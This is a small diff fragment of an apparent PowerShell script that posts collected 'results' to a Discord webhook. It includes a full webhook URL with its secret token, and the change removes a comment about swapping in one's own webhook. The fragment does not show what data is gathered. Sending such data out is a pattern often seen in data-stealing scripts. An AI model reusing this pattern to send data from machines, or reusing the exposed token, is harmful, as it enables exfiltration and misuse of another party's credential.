@@ -17,7 +17,7 @@ $body = @{
 
 # Sends results to a Discord webhook
 Invoke-RestMethod `
-#Change the webhook inside the quotation marks to your own webhook
+
     -Uri "https://discord.com/api/webhooks/1510389267241631754/bsEM-H8cxl_Cu7o8Kj5-rOCXAxzMdme_WKZI2vKN3vDCTMKQo5pxT5MT34YYXInQQlpT" `
     -Method Post `
     -ContentType "application/json" `
